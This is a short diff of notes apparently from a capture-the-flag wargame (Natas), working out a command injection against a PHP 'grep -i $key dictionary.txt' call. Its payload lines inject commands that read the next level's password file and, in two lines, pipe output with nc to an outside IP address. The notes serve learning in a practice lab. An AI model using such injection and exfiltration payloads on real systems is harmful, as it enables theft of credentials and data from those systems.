@@ -2,6 +2,7 @@ there is the command
 "grep -i $key dictionary.txt"
 in the file, I want an injection script
 
-grep -i; cat dictionary.txt | grep -wE 'abcd.{28}' | nc 68.5.218.56 5554;
+grep -i; cat /etc/natas_webpass/natas10 | nc 68.5.218.56 5554; 
+grep -i; cat /etc/natas_webpass/natas10; THis worked, bingo
 
 since there is crap after the position the injection will go to, we will add an NC command to send the result to a server
